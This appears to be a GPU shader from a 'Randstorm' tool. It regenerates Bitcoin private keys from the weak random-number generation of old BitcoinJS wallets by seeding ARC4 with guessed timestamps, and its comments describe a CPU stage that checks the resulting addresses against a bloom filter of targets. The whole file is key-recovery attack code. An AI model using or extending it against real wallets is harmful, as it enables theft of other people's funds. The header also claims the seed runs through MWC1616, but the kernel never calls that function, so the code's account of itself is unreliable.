// randstorm.wgsl — GPU generates private keys only.
// secp256k1 is done CPU-side (Rust secp256k1 crate via rayon).
//
// GPU pipeline: MWC1616 seed → ARC4 key schedule → 32-byte privkey → write to results
// CPU pipeline: privkey → secp256k1 → SHA256(pubkey) → RIPEMD160 → bloom check
//
// This hybrid approach is correct and ~10x faster than pure CPU because:
//   - ARC4 KSA (256 random swaps) is memory-bound, GPU L1 cache helps greatly
//   - RTX 3080 generates ~500M keys/s; secp256k1 CPU throughput ~2M keys/s
//   - CPU secp256k1 runs in parallel on 16 cores via rayon
//   - Bloom filter lookup is trivially fast on CPU

const TIMESTAMPS_PER_THREAD: u32 = 4u;
const WG_SIZE: u32 = 64u;

struct Fingerprint {
    timestamp_lo: u32,
    timestamp_hi: u32,
    screen_width:  u32,
    screen_height: u32,
};

// Results layout per fingerprint: 8 x u32 = 32 bytes privkey
@group(0) @binding(0) var<storage, read>       fingerprints: array<Fingerprint>;
@group(0) @binding(1) var<storage, read>       bloom_filter: array<u32>; // kept for future use
@group(0) @binding(2) var<storage, read_write> results: array<u32>;      // [fp_idx*8 .. +8] = privkey
@group(0) @binding(3) var<storage, read_write> arc4_state: array<u32>;   // [thread*256 .. +256]

// ---------------------------------------------------------------------------
// MWC1616 — V8 Math.random (vulnerable, 2011-2015)
// ---------------------------------------------------------------------------
struct Prng { s1: u32, s2: u32 };
fn mwc(p: ptr<function,Prng>) -> u32 {
    let c1=(*p).s1>>16u; let x1=((*p).s1&0xFFFFu)*18030u+c1;
    let c2=(*p).s2>>16u; let x2=((*p).s2&0xFFFFu)*30903u+c2;
    (*p).s1=x1; (*p).s2=x2;
    return ((x1&0xFFFFu)<<16u)|(x2&0xFFFFu);
}

// ---------------------------------------------------------------------------
// ARC4 — state in global arc4_state[thread_slot * 256 .. +256]
// ---------------------------------------------------------------------------
fn arc4_init(slot: u32, seed_lo: u32, seed_hi: u32) {
    let b = slot * 256u;
    for (var n=0u; n<256u; n++) { arc4_state[b+n]=n; }
    var j=0u;
    for (var n=0u; n<256u; n++) {
        let ki=n&7u;
        var kb: u32;
        if (ki<4u) { kb=(seed_lo>>(ki*8u))&0xFFu; }
        else        { kb=(seed_hi>>((ki-4u)*8u))&0xFFu; }
        j=(j+arc4_state[b+n]+kb)&0xFFu;
        let tmp=arc4_state[b+n]; arc4_state[b+n]=arc4_state[b+j]; arc4_state[b+j]=tmp;
    }
}

fn arc4_byte(slot: u32, ij: ptr<function,u32>) -> u32 {
    let b=slot*256u;
    var ii=(*ij>>8u)&0xFFu;
    var jj=(*ij)&0xFFu;
    ii=(ii+1u)&0xFFu;
    jj=(jj+arc4_state[b+ii])&0xFFu;
    let tmp=arc4_state[b+ii]; arc4_state[b+ii]=arc4_state[b+jj]; arc4_state[b+jj]=tmp;
    *ij=(ii<<8u)|jj;
    return arc4_state[b+((arc4_state[b+ii]+arc4_state[b+jj])&0xFFu)];
}

// ---------------------------------------------------------------------------
// Main kernel
// ---------------------------------------------------------------------------
@compute @workgroup_size(64)
fn randstorm_main(
    @builtin(global_invocation_id) gid: vec3<u32>,
    @builtin(local_invocation_id) lid: vec3<u32>,
) {
    let slot = gid.x; // ARC4 state slot
    let base_fp = gid.x * TIMESTAMPS_PER_THREAD;
    let n_fps = arrayLength(&fingerprints);

    for (var t=0u; t<TIMESTAMPS_PER_THREAD; t++) {
        let fp_idx = base_fp + t;
        if (fp_idx >= n_fps) { return; }

        let fp = fingerprints[fp_idx];

        // BitcoinJS v0.1.3: seed ARC4 with timestamp bytes
        arc4_init(slot, fp.timestamp_lo, fp.timestamp_hi);

        // Generate 32-byte private key
        var ij = 0u;
        var pk0=arc4_byte(slot,&ij); var pk1=arc4_byte(slot,&ij);
        var pk2=arc4_byte(slot,&ij); var pk3=arc4_byte(slot,&ij);
        var pk4=arc4_byte(slot,&ij); var pk5=arc4_byte(slot,&ij);
        var pk6=arc4_byte(slot,&ij); var pk7=arc4_byte(slot,&ij);
        var pk8=arc4_byte(slot,&ij); var pk9=arc4_byte(slot,&ij);
        var pk10=arc4_byte(slot,&ij); var pk11=arc4_byte(slot,&ij);
        var pk12=arc4_byte(slot,&ij); var pk13=arc4_byte(slot,&ij);
        var pk14=arc4_byte(slot,&ij); var pk15=arc4_byte(slot,&ij);
        var pk16=arc4_byte(slot,&ij); var pk17=arc4_byte(slot,&ij);
        var pk18=arc4_byte(slot,&ij); var pk19=arc4_byte(slot,&ij);
        var pk20=arc4_byte(slot,&ij); var pk21=arc4_byte(slot,&ij);
        var pk22=arc4_byte(slot,&ij); var pk23=arc4_byte(slot,&ij);
        var pk24=arc4_byte(slot,&ij); var pk25=arc4_byte(slot,&ij);
        var pk26=arc4_byte(slot,&ij); var pk27=arc4_byte(slot,&ij);
        var pk28=arc4_byte(slot,&ij); var pk29=arc4_byte(slot,&ij);
        var pk30=arc4_byte(slot,&ij); var pk31=arc4_byte(slot,&ij);

        // Pack 32 bytes into 8 x u32 (big-endian, matching secp256k1 scalar convention)
        let out = fp_idx * 8u;
        results[out+0u] = (pk0<<24u)|(pk1<<16u)|(pk2<<8u)|pk3;
        results[out+1u] = (pk4<<24u)|(pk5<<16u)|(pk6<<8u)|pk7;
        results[out+2u] = (pk8<<24u)|(pk9<<16u)|(pk10<<8u)|pk11;
        results[out+3u] = (pk12<<24u)|(pk13<<16u)|(pk14<<8u)|pk15;
        results[out+4u] = (pk16<<24u)|(pk17<<16u)|(pk18<<8u)|pk19;
        results[out+5u] = (pk20<<24u)|(pk21<<16u)|(pk22<<8u)|pk23;
        results[out+6u] = (pk24<<24u)|(pk25<<16u)|(pk26<<8u)|pk27;
        results[out+7u] = (pk28<<24u)|(pk29<<16u)|(pk30<<8u)|pk31;
    }
}
